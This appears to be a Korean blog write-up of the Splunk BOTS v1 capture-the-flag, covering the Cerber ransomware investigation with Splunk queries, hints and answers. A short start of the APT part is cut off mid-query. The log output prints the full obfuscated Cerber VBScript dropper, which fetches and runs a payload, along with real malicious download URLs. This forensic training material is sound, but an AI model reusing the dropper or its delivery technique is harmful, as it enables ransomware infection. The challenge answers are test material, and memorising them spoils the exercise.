2016/08/24 16:34:45.589      http://crl.microsoft.com/pki/crl/products/WinPCA.crl                     2016/08/24 16:34:50.301      http://www.microsoft.com/pki/CRL/products/Microsoft%20Windows%20Hardware%20Compatibility%20PCA(1).crl                     2016/08/24 16:48:13.285      http://solidaritedeproximite.org/mhtr.jpg                     2016/08/24 16:48:14.620      http://92.222.104.182/mhtr.jpg                     2016/08/24 16:49:24.504      http://ipinfo.io/json                     2016/08/24 16:53:21.344      http://go.microsoft.com/fwlink/                     2016/08/24 16:53:26.936      http://go.microsoft.com/fwlink/             URL중 microsoft, ipinfo는 유명한 URL이지만 solidaritedeproximite.org는 알려지지 않은 URL이므로 의심 할 수 있습니다.답 : solidaritedeproximite.org204\tDuring the initial Cerber infection a VB script is run. The entire script from this execution, pre-pended by the name of the launching .exe, can be found in a field in Splunk. What is the length in characters of the value of this field?초기 Cerber 감염 동안 VB 스크립트가 실행됩니다. 시작하는 .exe의 이름이 앞에 추가된 이 실행의 전체 스크립트는 Splunk의 필드에서 찾을 수 있습니다. 이 필드 값의 문자 길이는 얼마입니까?  hint#1  Keep it simple.  Start by looking at sysmon data for the infected device on the date in question.  Calculate the length of the command line using the \"len()\" function of the \"eval\" SPL command, and give your eyes a break by using the splunk table command.   간단하게 생각하세요. 해당 날짜에 감염된 장치에 대한 sysmon 데이터를 확인하여 시작합니다. \"eval\" SPL 명령의 \"len()\" 함수를 사용하여 명령줄의 길이를 계산하고 splunk table 명령을 사용하여 시각화 합니다.command관련 데이터는 sysmon에 있을것입니다. 아래 조건을 추가해 검색해 봅니다.  .exe와 vbs(VB 스크립트)를 추가  스크립트 실행이므로 EventCode=1(Process Creation)  감염된 host인 we8105desk에서 검색  ParentCommandLine과 CommandLine의 길이를 계산sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational .exe *vbs*host=we8105desk EventCode=1| eval lenPcl=len(ParentCommandLine) | eval lenCl=len(CommandLine)| table lenCl CommandLine lenPcl ParentCommandLine            lenCl      CommandLine      lenPcl      ParentCommandLine                  76      cscript.exe /nologo C:\\Windows\\TEMP\\AE501557-78F9-4459-8FCF-315C305567CC.vbs      73      “C:\\Program Files (x86)\\Common Files\\Acronis\\Infrastructure\\mms_mini.exe”              76      cscript.exe /nologo C:\\Windows\\TEMP\\8258BF6F-9A60-4ACD-87CE-C5C347639FA6.vbs      73      “C:\\Program Files (x86)\\Common Files\\Acronis\\Infrastructure\\mms_mini.exe”              76      cscript.exe /nologo C:\\Windows\\TEMP\\D63D009F-2486-4872-8ED8-898159C8A33B.vbs      73      “C:\\Program Files (x86)\\Common Files\\Acronis\\Infrastructure\\mms_mini.exe”              76      cscript.exe /nologo C:\\Windows\\TEMP\\5F336C48-BD3F-46AF-8FB1-E076BA7329CB.vbs      73      “C:\\Program Files (x86)\\Common Files\\Acronis\\Infrastructure\\mms_mini.exe”              76      cscript.exe /nologo C:\\Windows\\TEMP\\A1985133-B0BB-4771-9B34-54C1DC493370.vbs      73      “C:\\Program Files (x86)\\Common Files\\Acronis\\Infrastructure\\mms_mini.exe”              76      cscript.exe /nologo C:\\Windows\\TEMP\\E5548D7D-7D5D-4693-A892-94129A925C26.vbs      73      “C:\\Program Files (x86)\\Common Files\\Acronis\\Infrastructure\\mms_mini.exe”              4490      cmd.exe /V /C set “GSI=%APPDATA%\\%RANDOM%.vbs” &amp;&amp; (for %i in (“DIm RWRL” “FuNCtioN GNbiPp(Pt5SZ1)” “EYnt=45” “GNbiPp=AsC(Pt5SZ1)” “Xn1=52” “eNd fuNCtiON” “SUb OjrYyD9()” “J0Nepq=56” “Dim UJv,G4coQ” “LT=23” “dO WHiLE UJv&lt;&gt;3016-3015” “G4coQ=G4coQ+1” “WSCRiPt.sLEeP(11)” “LoOP” “UsZK0=85” “ENd suB” “fuNctIon J7(BLI4A3)” “K5AU=29” “J7=cHR(BLI4A3)” “XBNutM9=36” “eNd fuNCtiON” “SUb MA(QrG)” “WXCzRz=9” “Dim Jw” “Qt7=34” “Jw=TIMeR+QrG” “Do WhiLE tIMEr&lt;Jw” “WSCRipT.sleEP(6)” “LOOp” “EXdkRkH=78” “enD sUB” “fUnCTion M1p67jL(BwqIM7,Qa)” “Yi=80” “dIM KH,ChnFY,RX,Pg,C6YT(8)” “Cm=7” “C6YT(1)=107” “Rzf=58” “C6YT(5)=115” “BSKoW=10” “C6YT(4)=56” “Cwd6=35” “C6YT(7)=110” “AQ=98” “C6YT(6)=100” “Y6Cm1I=82” “C6YT(2)=103” “JH3F2i=74” “C6YT(8)=119” “JRvsG2s=76” “C6YT(3)=53” “Yh=31” “C6YT(0)=115” “GuvD=47” “Tbvf1=67” “SeT KH=cReATeObject(A9y(“3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D”, “Yo”))” “V2JR=73” “Set ChnFY=KH.GETfilE(BwqIM7)” “RGeJ=68” “SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)” “CtxOk=82” “seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)” “XPL9af=76” “Do uNtil Pg.aTEnDOfStReam” “RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))” “LooP” “IQz=49” “RX.cloSe” “CBR1gC7=51” “Pg.cLOSE” “PmG=64” “eNd funCTIOn” “FUNcTION Ql9zEF()” “IBL2=16” “Ql9zEF=secoND(Time)” “MUTkPNJ=41” “End FUNcTiOn” “FUnCtion A9y(Am,T1GCbB)” “CWCH9r=82” “Dim V3sl0m,F4ra,AxFE” “RLLp8R=89” “For V3sl0m=1 To (lEn(Am)/2)” “F4ra=(J7((8270-8232)) &amp; J7((5328/74))&amp;(miD(Am,(V3sl0m+V3sl0m)-1,2)))” “AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))” “A9y=A9y+J7(OyVNo(F4ra,AxFE))” “NeXT” “DxZ40=89” “enD fUNction” “Sub AylniN()” “N6nzb=92” “DIm GWJCk,Q3y,GKasG0” “FDu=47” “GWJCk=93961822” “UZ=32” “FoR Q3y=1 To GWJCk” “GKasG0=GKasG0+1” “neXt” “B1jq2Hk=63” “If GKasG0=GWJCk tHen” “KXso=18” “MA((-176+446))” “IP4=48” “Yq(A9y(“0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826”,”QcOi4XA”))” “YTsWy=31” “elSe” “DO5gpmA=84” “A8=86” “EnD iF” “XyUP=64” “eND SuB” “sUB GKfD3aY(FaddNPJ)” “SDU0BLq=57” “DiM UPhqZ,KbcT” “DxejPK=88” “KbcT=”Drn4AW”” “GROlc7=82” “sET UPhqZ=CREAteOBJecT(A9y(“332A7B05156A211A46243629”,KbcT))” “Gs0g=3” “UPhqZ.OpEn” “TF1=68” “UPhqZ.tyPE=6867-6866” “RDjmY=24” “UPhqZ.wrITe FaddNPJ” “WiFgvS=78” “UPhqZ.SaVeTOfIle RWRL,8725-8723” “AF=4” “UPhqZ.closE” “JC7sf2=1” “Cke4e” “JM=88” “EnD suB” “fuNCtIoN Yq(PDqi1)” “I0=22” “DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK” “GJDnbE=32” “On ErrOR reSume NeXT” “B7bT=1” “Uv=”Tk”” “ELw=73” “sEt YTwwO=CREaTeObjeCT(A9y(“3C07082602241F7A383C0E3807”,Uv))” “K4=62” “GAiF” “IS1cj=19” “Set Dzc0=YTwwO.eNVIrONMEnt(A9y(“013B183400023A”,”EQiWw”))” “D9S=38” “RWRL=Dzc0(A9y(“14630811720C14”,”XU3”))&amp;J7((8002-7910))&amp; Ql9zEF &amp; Ql9zEF” “AtCQ=95” “JiYwVG=”FcQqQ”” “Tf=79” “sEt BAU7Cz=CrEATEoBjECT(A9y(“2E38122329103E1725683B1C3D19123701”,JiYwVG))” “QUY=56” “BAU7Cz.OpeN A9y(“0D0E1E”,”KJ”),PDqi1,7387-7387” “JX2=58” “BAU7Cz.SeTReQuEstHeAdeR A9y(“1F59242828”,”OM8J”),A9y(“0D354C3D356B567A0F6B6B”,”VoL8XF”)” “URkT=71” “BAU7Cz.SEnD()” “QdFeA6=65” “if BAU7Cz.StaTUstExt=A9y(“652840353A542512023C5B3D572F27”,”S5I2A”) then” “PwTLW23=36” “GAiF” “R4xYBS=63” “MA(4)” “PjL6m=46” “GKfD3aY BAU7Cz.ReSpONSEbody” “Fj98=72” “Else” “D7T=91” “IK=”NNXFD0”” “NK=74” “SeT BAU7Cz= CreATeobJECT(A9y(“033125365F3D213E326A68030210121060”,IK))” “QJ=35” “BAU7Cz.oPeN A9y(“2A2F0E”,”TmjZ8d”),A9y(“07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26”,”Ao” ),5022-5022” “UMp8=85” “BAU7Cz.SeTReqUesTheadER A9y(“1439190A24”,”AFXwm”),A9y(“371038301A716C5F7B6644”,”LUi”)” “NluUc=93” “BAU7Cz.SENd()” “EOtR=44” “If BAU7Cz.STaTUSTexT=A9y(“03510A3B3A51146F105F163B365E0C”,”OS0x”) THen GKfD3aY BAU7Cz.REsPOnSeBODY” “Q6sMEZ=54” “I9Nl7=56” “end if” “Dq=54” “eND FuNCTioN” “fUNctIon OyVNo(U1,Brt0d)” “SNOW=59” “OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)” “QTi5K=54” “enD funcTION” “Sub Cke4e()” “WTOyAw=62” “dIM EuM,WIbud,NCiN,Fs8HJ” “A5AT=92” “NCiN=””””” “SX6=93” “WIbud=RWRL &amp; Ql9zEF &amp; A9y(“4A330F3F”,”WdGbOGp”)” “V5B7Zh=92” “M1p67jL RWRL,WIbud” “L13=45” “iF Fs8HJ=”” tHen MA(4)” “CHaK=38” “EuM=”Iqxkf”” “U56m=67” “SEt VP=creATeoBJEcT(A9y(“262B081420010C453521141407”,EuM))” “U5Quw=85” “VP.Run A9y(“1023287B163629755C0D6C06270F1E01536C6E7551”,”UsNL”) &amp; WIbud &amp; NCiN,2912-2912,5755-5755” “A6mfcYL=76” “End sUB” “JoxZ3=43” “AylniN” “suB GAiF()” “G4vzM=95” “Dim DCRml9g, CjoNOY9” “For DCRml9g = 68 To 6000327” “CjoNOY9 = Rvwr + 23 + 35 + 27” “Next” “KK0H=46” “enD sUb”) do @echo %~i)&gt;“!GSI!” &amp;&amp; start “” “!GSI!”      100      “C:\\Program Files (x86)\\Microsoft Office\\Office14\\WINWORD.EXE” /n /f “D:\\Miranda_Tate_unveiled.dotm”              93      “C:\\Windows\\System32\\WScript.exe” “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\20429.vbs”      4490      cmd.exe /V /C set “GSI=%APPDATA%\\%RANDOM%.vbs” &amp;&amp; (for %i in (“DIm RWRL” “FuNCtioN GNbiPp(Pt5SZ1)” “EYnt=45” “GNbiPp=AsC(Pt5SZ1)” “Xn1=52” “eNd fuNCtiON” “SUb OjrYyD9()” “J0Nepq=56” “Dim UJv,G4coQ” “LT=23” “dO WHiLE UJv&lt;&gt;3016-3015” “G4coQ=G4coQ+1” “WSCRiPt.sLEeP(11)” “LoOP” “UsZK0=85” “ENd suB” “fuNctIon J7(BLI4A3)” “K5AU=29” “J7=cHR(BLI4A3)” “XBNutM9=36” “eNd fuNCtiON” “SUb MA(QrG)” “WXCzRz=9” “Dim Jw” “Qt7=34” “Jw=TIMeR+QrG” “Do WhiLE tIMEr&lt;Jw” “WSCRipT.sleEP(6)” “LOOp” “EXdkRkH=78” “enD sUB” “fUnCTion M1p67jL(BwqIM7,Qa)” “Yi=80” “dIM KH,ChnFY,RX,Pg,C6YT(8)” “Cm=7” “C6YT(1)=107” “Rzf=58” “C6YT(5)=115” “BSKoW=10” “C6YT(4)=56” “Cwd6=35” “C6YT(7)=110” “AQ=98” “C6YT(6)=100” “Y6Cm1I=82” “C6YT(2)=103” “JH3F2i=74” “C6YT(8)=119” “JRvsG2s=76” “C6YT(3)=53” “Yh=31” “C6YT(0)=115” “GuvD=47” “Tbvf1=67” “SeT KH=cReATeObject(A9y(“3C3A1D301F2D063708772930033C3C201C2D0A34203B053C0C2D”, “Yo”))” “V2JR=73” “Set ChnFY=KH.GETfilE(BwqIM7)” “RGeJ=68” “SeT Pg=ChnFY.opEnASTExTstReAM(6806-6805,7273-7273)” “CtxOk=82” “seT RX=KH.cREateteXtFiLe(Qa,6566-6565,2508-2508)” “XPL9af=76” “Do uNtil Pg.aTEnDOfStReam” “RX.wRitE J7(OyVNo(GNbiPp(Pg.rEAD(6633-6632)),C6YT(0)))” “LooP” “IQz=49” “RX.cloSe” “CBR1gC7=51” “Pg.cLOSE” “PmG=64” “eNd funCTIOn” “FUNcTION Ql9zEF()” “IBL2=16” “Ql9zEF=secoND(Time)” “MUTkPNJ=41” “End FUNcTiOn” “FUnCtion A9y(Am,T1GCbB)” “CWCH9r=82” “Dim V3sl0m,F4ra,AxFE” “RLLp8R=89” “For V3sl0m=1 To (lEn(Am)/2)” “F4ra=(J7((8270-8232)) &amp; J7((5328/74))&amp;(miD(Am,(V3sl0m+V3sl0m)-1,2)))” “AxFE=(GNbiPp(mID(T1GCbB,((V3sl0m MOd Len(T1GCbB))+1),1)))” “A9y=A9y+J7(OyVNo(F4ra,AxFE))” “NeXT” “DxZ40=89” “enD fUNction” “Sub AylniN()” “N6nzb=92” “DIm GWJCk,Q3y,GKasG0” “FDu=47” “GWJCk=93961822” “UZ=32” “FoR Q3y=1 To GWJCk” “GKasG0=GKasG0+1” “neXt” “B1jq2Hk=63” “If GKasG0=GWJCk tHen” “KXso=18” “MA((-176+446))” “IP4=48” “Yq(A9y(“0B3B1D44626E7E1020055D3C20230A3B0C503D31230C3700593135344D201B53772C39173D475E2826”,”QcOi4XA”))” “YTsWy=31” “elSe” “DO5gpmA=84” “A8=86” “EnD iF” “XyUP=64” “eND SuB” “sUB GKfD3aY(FaddNPJ)” “SDU0BLq=57” “DiM UPhqZ,KbcT” “DxejPK=88” “KbcT=”Drn4AW”” “GROlc7=82” “sET UPhqZ=CREAteOBJecT(A9y(“332A7B05156A211A46243629”,KbcT))” “Gs0g=3” “UPhqZ.OpEn” “TF1=68” “UPhqZ.tyPE=6867-6866” “RDjmY=24” “UPhqZ.wrITe FaddNPJ” “WiFgvS=78” “UPhqZ.SaVeTOfIle RWRL,8725-8723” “AF=4” “UPhqZ.closE” “JC7sf2=1” “Cke4e” “JM=88” “EnD suB” “fuNCtIoN Yq(PDqi1)” “I0=22” “DiM YTwwO,BAU7Cz,Uv,JiYwVG,IK” “GJDnbE=32” “On ErrOR reSume NeXT” “B7bT=1” “Uv=”Tk”” “ELw=73” “sEt YTwwO=CREaTeObjeCT(A9y(“3C07082602241F7A383C0E3807”,Uv))” “K4=62” “GAiF” “IS1cj=19” “Set Dzc0=YTwwO.eNVIrONMEnt(A9y(“013B183400023A”,”EQiWw”))” “D9S=38” “RWRL=Dzc0(A9y(“14630811720C14”,”XU3”))&amp;J7((8002-7910))&amp; Ql9zEF &amp; Ql9zEF” “AtCQ=95” “JiYwVG=”FcQqQ”” “Tf=79” “sEt BAU7Cz=CrEATEoBjECT(A9y(“2E38122329103E1725683B1C3D19123701”,JiYwVG))” “QUY=56” “BAU7Cz.OpeN A9y(“0D0E1E”,”KJ”),PDqi1,7387-7387” “JX2=58” “BAU7Cz.SeTReQuEstHeAdeR A9y(“1F59242828”,”OM8J”),A9y(“0D354C3D356B567A0F6B6B”,”VoL8XF”)” “URkT=71” “BAU7Cz.SEnD()” “QdFeA6=65” “if BAU7Cz.StaTUstExt=A9y(“652840353A542512023C5B3D572F27”,”S5I2A”) then” “PwTLW23=36” “GAiF” “R4xYBS=63” “MA(4)” “PjL6m=46” “GKfD3aY BAU7Cz.ReSpONSEbody” “Fj98=72” “Else” “D7T=91” “IK=”NNXFD0”” “NK=74” “SeT BAU7Cz= CreATeobJECT(A9y(“033125365F3D213E326A68030210121060”,IK))” “QJ=35” “BAU7Cz.oPeN A9y(“2A2F0E”,”TmjZ8d”),A9y(“07351B31556E40785D6F5D735D6F5E715B6F5E795D6E02291B33412B1F26”,”Ao” ),5022-5022” “UMp8=85” “BAU7Cz.SeTReqUesTheadER A9y(“1439190A24”,”AFXwm”),A9y(“371038301A716C5F7B6644”,”LUi”)” “NluUc=93” “BAU7Cz.SENd()” “EOtR=44” “If BAU7Cz.STaTUSTexT=A9y(“03510A3B3A51146F105F163B365E0C”,”OS0x”) THen GKfD3aY BAU7Cz.REsPOnSeBODY” “Q6sMEZ=54” “I9Nl7=56” “end if” “Dq=54” “eND FuNCTioN” “fUNctIon OyVNo(U1,Brt0d)” “SNOW=59” “OyVNo=(U1 ANd noT Brt0d)oR(NOt U1 And Brt0d)” “QTi5K=54” “enD funcTION” “Sub Cke4e()” “WTOyAw=62” “dIM EuM,WIbud,NCiN,Fs8HJ” “A5AT=92” “NCiN=””””” “SX6=93” “WIbud=RWRL &amp; Ql9zEF &amp; A9y(“4A330F3F”,”WdGbOGp”)” “V5B7Zh=92” “M1p67jL RWRL,WIbud” “L13=45” “iF Fs8HJ=”” tHen MA(4)” “CHaK=38” “EuM=”Iqxkf”” “U56m=67” “SEt VP=creATeoBJEcT(A9y(“262B081420010C453521141407”,EuM))” “U5Quw=85” “VP.Run A9y(“1023287B163629755C0D6C06270F1E01536C6E7551”,”UsNL”) &amp; WIbud &amp; NCiN,2912-2912,5755-5755” “A6mfcYL=76” “End sUB” “JoxZ3=43” “AylniN” “suB GAiF()” “G4vzM=95” “Dim DCRml9g, CjoNOY9” “For DCRml9g = 68 To 6000327” “CjoNOY9 = Rvwr + 23 + 35 + 27” “Next” “KK0H=46” “enD sUb”) do @echo %~i)&gt;“!GSI!” &amp;&amp; start “” “!GSI!”              102      “C:\\Windows\\System32\\cmd.exe” /C START “” “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp”      93      “C:\\Windows\\System32\\WScript.exe” “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\20429.vbs”              100      “C:\\Windows\\System32\\WScript.exe” “C:\\Users\\bob.smith.WAYNECORPINC\\Desktop# DECRYPT MY FILES #.vbs”      96      “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming{35ACA89F-933F-6A5D-2776-A3589FB99832}\\osk.exe”      vbs가 처음 실행하는 명령어의 길이는 4490입니다.답 : 4490205\tWhat is the name of the USB key inserted by Bob Smith?Bob Smith가 삽입한 USB 키의 이름은 무엇입니까?  hint#1  Tough question.  Perhaps you should give http://answers.splunk.com a try.  어려운 문제입니다. http://answer.splunk.com을 사용해 보십시오.USB의 이름은 friendlyname 컬럼에 저장되어있습니다. 해당값은 registry에 저장되어있으므로 sourcetype은 WinRegistry 입니다.FriendlyName이란?friendlyname  결과    08/24/2016 10:42:17.287  event_status=\"(0)The operation completed successfully.\"  pid=708  process_image=\"c:\\Windows\\System32\\svchost.exe\"  registry_type=\"SetValue\"  key_path=\"HKLM\\system\\controlset001\\enum\\wpdbusenumroot\\umb\\2&amp;37c186b&amp;0&amp;storage#volume#_??_usbstor#disk&amp;ven_generic&amp;prod_flash_disk&amp;rev_8.07#7d961196&amp;0#\\friendlyname\"  data_type=\"REG_SZ\"  data=\"MIRANDA_PRI\"  host=we8105desk source=WinRegistry sourcetype=WinRegistry      registry의 data값이 MIRANDA_PRI임을 알수 있습니다.답 : MIRANDA_PRI206\tBob Smith’s workstation (we8105desk) was connected to a file server during the ransomware outbreak. What is the IP address of the file server?Bob Smith의 워크스테이션(we8105desk)은 랜섬웨어가 발생하는 동안 파일 서버에 연결되었습니다. 파일 서버의 IP 주소는 무엇입니까?  hint#1  Search for SMB (Windows file sharing protocol) traffic from the infected device on the date in question. The \"stats\" SPL command can be used to count the most common destination IP for the SMB protocol.    해당 날짜에 감염된 장치에서 SMB(Windows 파일 공유 프로토콜) 트래픽을 검색합니다. \"stats\" SPL 명령은 SMB 프로토콜에 대한 가장 일반적인 대상 IP를 계산하는 데 사용할 수 있습니다.이 질문은 207, 209를 풀면 더 쉽게 알 수 있습니다.207번 질문에서 원격 파일 서버의 pdf가 암호화되었다고 했으니, 검색해보면hostname은 we9041srv.waynecorpinc.local, IP는 192.168.250.20인것을 알 수 있습니다.답 : 192.168.250.20207\tHow many distinct PDFs did the ransomware encrypt on the remote file server?랜섬웨어는 원격 파일 서버에서 얼마나 많은 개별 PDF를 암호화했습니까?  hint#1  Don't use SMB this time - it's a trap!  Windows event logs are the way to go for this one.  Focus on the event types that deal with windows shares and narrow the search by looking for distinct filenames for the extension in question.  이번에는 SMB를 사용하지 마십시오. 함정입니다! Windows 이벤트 로그는 이를 위한 방법입니다. Windows 공유를 처리하는 이벤트 유형에 집중하고 해당 확장에 대한 고유한 파일 이름을 찾아 검색 범위를 좁힙니다.pdf 확장자를 검색해봅니다..pdf파일이 암호화되었다면 eventlog에 파일생성, 파일 변경 등의 로그가 있을것입니다.또, we8015에 있는 랜섬웨어가 원격서버인 we9041srv의 파일을 암호화 한것이므로 목적지가 we9041srv인 조건을 추가해 검색해봅니다.sourcetype=\"wineventlog\" .pdf dest=we9041srv.waynecorpinc.local 192.168.250.100 | stats dc(Relative_Target_Name)  결과            dc(Relative_Target_Name)                  257      답 : 257208\tThe VBscript found in question 204 launches 121214.tmp. What is the ParentProcessId of this initial launch?문제 204에서 찾은 VBscript는 121214.tmp를 시작합니다. 이 초기 실행의 ParentProcessId는 무엇입니까?  hint#1  Embrace your sysmon data.  Search for a command issued by the infected device on the date in question referencing the filename in question, and use the process_id, ParentProcessId, CommandLine,  and ParentCommandLine, to track down the parent process id of them all.   sysmon 데이터를 수용하십시오. 해당 파일 이름을 참조하여 해당 날짜에 감염된 장치에서 실행된 명령을 검색하고 process_id, ParentProcessId, CommandLine 및 ParentCommandLine을 사용하여 모두의 상위 프로세스 ID를 추적합니다.parentprocessid는 sysmon에서 찾을 수 있습니다.sourcetype=\"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational\" 121214.tmp| where isnotnull(parent_process_id)| table _time parent_process_id ParentCommandLine process_id CommandLine | sort _time            _time      parent_process_id      ParentCommandLine      process_id      CommandLine                  2016/08/24 16:48:21      1476      “C:\\Windows\\System32\\cmd.exe” /C START “” “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp”      2948      “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp”              2016/08/24 16:48:21      3968      “C:\\Windows\\System32\\WScript.exe” “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\20429.vbs”      1476      “C:\\Windows\\System32\\cmd.exe” /C START “” “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp”              2016/08/24 16:48:29      2948      “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp”      3828      “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp”              2016/08/24 16:48:41      1280      /d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” &gt; NUL      1684      taskkill  /t /f /im “121214.tmp”              2016/08/24 16:48:41      3828      “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp”      1280      /d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” &gt; NUL              2016/08/24 16:48:41      3828      “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp”      3836\t“C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming{35ACA89F-933F-6A5D-2776-A3589FB99832}\\osk.exe”                     2016/08/24 16:48:42      1280      /d /c taskkill /t /f /im “121214.tmp” &gt; NUL &amp; ping -n 1 127.0.0.1 &gt; NUL &amp; del “C:\\Users\\bob.smith.WAYNECORPINC\\AppData\\Roaming\\121214.tmp” &gt; NUL      556      ping  -n 1 127.0.0.1      질문에서 vbs가 121214.tmp를 실행시켰다고 하니 20429.vbs가 실행파일임을 알 수 있습니다.답 : 3968209\tThe Cerber ransomware encrypts files located in Bob Smith’s Windows profile. How many .txt files does it encrypt?Cerber 랜섬웨어는 Bob Smith의 Windows 프로필에 있는 파일을 암호화합니다. 얼마나 많은 .txt 파일을 암호화합니까?  hint#1  Sysmon to the rescue again.  Focus on the infected machine as well as the user profile while searching for the filename extension in question.  Sysmon에서 다시 찾읍시다. 문제의 파일 이름 확장자를 검색하는 동안 감염된 시스템과 사용자 프로필에 집중하십시오.  hint#2  In Sysmon events, EventCode=2 indicates file creation time has changed. Watch out for duplicates!  Sysmon 이벤트에서 EventCode=2는 파일 생성 시간이 변경되었음을 나타냅니다. 중복에 주의하세요!bob의 hostname은 we8105desk임을 전 문제에서 파악했습니다. 아래 조건대로 쿼리를 작성해 검색해 봅시다.  침해당한 host는 we8105desk이다.  침해당한 파일들의 확장자는 .txt파일  File이 새로 생성 및 수정 됐을것이므로, eventCode는 2번일것이다(File Create time)  TargetFilename을 보면 경로가 소유자/파일명형식으로 되어있다. 소유자가 bob smith인 데이터를 발췌.sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational host=we8105desk EventCode=2 TargetFilename=*smith*.txt| stats dc(TargetFilename)  결과            dc(TargetFilename)                  406      답 : 406210\tThe malware downloads a file that contains the Cerber ransomware cryptor code. What is the name of that file?멀웨어는 Cerber 랜섬웨어 암호화 코드가 포함된 파일을 다운로드합니다. 그 파일의 이름은 무엇입니까?  hint#1  When looking for potentially malicious file, start your search with the Suricata data.  Narrow your search by focusing on the infected device. Remember malware does not always have to begin as an executable file.    잠재적인 악성 파일을 찾을 때 Suricata 데이터로 검색을 시작하십시오. 감염된 장치에 집중하여 검색 범위를 좁힙니다. 맬웨어가 항상 실행 파일로 시작해야 하는 것은 아닙니다.203번 문제에서 파악한 의심스러운 도메인 solidaritedeproximite.org을 키워드로 suricata에서 찾아봅시다.sourcetype=suricata solidaritedeproximite.org| dedup src dest dest_ip url| table src dest dest_ip url  결과            src      dest      dest_ip      url                  37.187.37.150      solidaritedeproximite.org      192.168.250.100      /mhtr.jpg              192.168.250.100      solidaritedeproximite.org      37.187.37.150      /mhtr.jpg      의심스러운 도메인에서 접속한 파일은 이미지파일인 mhtr.jpg입니다.답 : mhtr.jpg211\tNow that you know the name of the ransomware’s encryptor file, what obfuscation technique does it likely use?이제 랜섬웨어의 암호화 파일 이름을 알았으니 어떤 난독화 기술을 사용할까요?  hint#1  The enrcyptor file was an image!    암호화 파일은 이미지였습니다!암호화 파일은 이미지였으므로, 이미지관련 난독화기술은 steganography입니다.steganography란?",
        "url": "/splunk-BOTS-v1-part2"
    }
    ,
    
    "splunk-bots-v1-part1": {
        "title": "splunk-bots-v1 write up - part1",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk SOC 대회인 BOSS OF THE SOC(BOTS) Write upSplunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과시나리오는 아래와 같습니다.Scenario 1 (APT):The focus of this hands on lab will be an APT scenario and a ransomware scenario. You assume the persona of Alice Bluebird, the analyst who has recently been hired to protect and defend Wayne Enterprises against various forms of cyberattack.In this scenario, reports of the below graphic come in from your user community when they visit the Wayne Enterprises website, and some of the reports reference “P01s0n1vy.” In case you are unaware, P01s0n1vy is an APT group that has targeted Wayne Enterprises. Your goal, as Alice, is to investigate the defacement, with an eye towards reconstructing the attack via the Lockheed Martin Kill Chain.- 시나리오#1 요약해킹그룹 P01s0n1vy가 Wayne기업를 해킹했습니다. 당신은 보안 담당자, Alice Bluebird의 입장에서 Lockheed Martin의 Cyberkillchain 모델을 이용해 침해 사고를 분석해야 합니다.[록히드마틴 사이버킬체인 7단계]Scenario 2 (Ransomeware):In the second scenario, one of your users is greeted by this image on a Windows desktop that is claiming that files on the system have been encrypted and payment must be made to get the files back. It appears that a machine has been infected with Cerber ransomware at Wayne Enterprises and your goal is to investigate the ransomware with an eye towards reconstructing the attack.- 시나리오#2 요약Wayne기업 직원 중 한 명이 시스템의 파일이 암호화 되었으며 파일을 복호화하려면 비용을 지불해야 하는 내용의 이미지를 보게 됩니다. 시스템이 Wayne의 Cerber 랜섬웨어에 감염된 것으로 보이며 귀하의 목표는 재공격을 염두에 두고 랜섬웨어를 조사하는 것입니다.101\tWhat is the likely IP address of someone from the Po1s0n1vy group scanning imreallynotbatman.com for web application vulnerabilities?웹 애플리케이션 취약점에 대해 imreallynotbatman.com을 스캔하는 Po1s0n1vy 그룹의 누군가의 가능한 IP 주소는 무엇입니까?  hint#1Start your search with \"sourcetype=stream:http\" and review the rich data captured in these events.sourcetype=stream:http로 검색을 시작하고 이러한 이벤트에서 캡처된 풍부한 데이터를 검토하십시오.  hint#2You'll notice that source and destination IP addresses are stored in fields called src_ip and dest_ip respectively. Determine top-talkers for HTTP by combining : \"sourcetype=stream:http | stats count by src_ip, dest_ip | sort -count\"출발지 및 대상 IP 주소가 각각 src_ip 및 dest_ip라는 필드에 저장되어 있습니다. 조합하여 가장 많은 HTTP이벤트를 조사합니다.원하는 데이터는 IP입니다. 어떤 sourcetype에 있을지 찾아봅니다.| metadata type=sourcetypes index=botsv1| stats 